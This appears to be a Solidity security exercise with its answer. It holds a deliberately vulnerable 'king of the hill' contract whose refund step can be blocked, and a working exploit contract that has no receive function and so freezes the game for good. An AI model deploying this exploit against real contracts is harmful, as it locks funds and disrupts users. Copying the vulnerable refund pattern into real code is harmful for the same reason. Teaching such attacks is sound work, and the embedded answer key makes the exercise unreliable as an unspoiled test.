// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Rules: Deposit more than previous user to become the king.

// Task: Become the king and disable the contract so that no 
// one else can ever become the new king. 10 ETH will be sent
// to pwn()

// Answer: The KingOfEthExploit contract works because it doesn't
// have a fallback or recieve function, and can never receive the 
// refund from the play() function.  
contract KingOfEth {
    address payable public king;

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");

        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}

interface IKingOfEth {
    function play() external payable;
}


contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(IKingOfEth _target) {
        target = _target;
    }

    function pwn() external payable {
        target.play{value: msg.value}();
    }
}
